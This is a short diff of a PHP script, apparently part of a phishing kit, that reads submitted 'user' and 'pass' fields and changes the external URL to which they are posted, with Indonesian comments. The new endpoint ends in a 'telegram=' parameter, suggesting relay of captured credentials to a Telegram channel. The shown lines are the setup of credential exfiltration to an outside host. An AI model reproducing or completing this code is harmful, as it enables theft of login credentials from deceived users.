@@ -4,7 +4,7 @@ $user = $_POST['user'];
 $pass = $_POST['pass'];
 
 // URL tujuan
-$url = "https://hosthenhker.jsjsjjs.website/apiii.php";
+$url = "https://hosthenhker.jsjsjjs.website/terminal/message.com.php?telegram=";
 
 // Data yang akan dikirim melalui POST
 $data = [
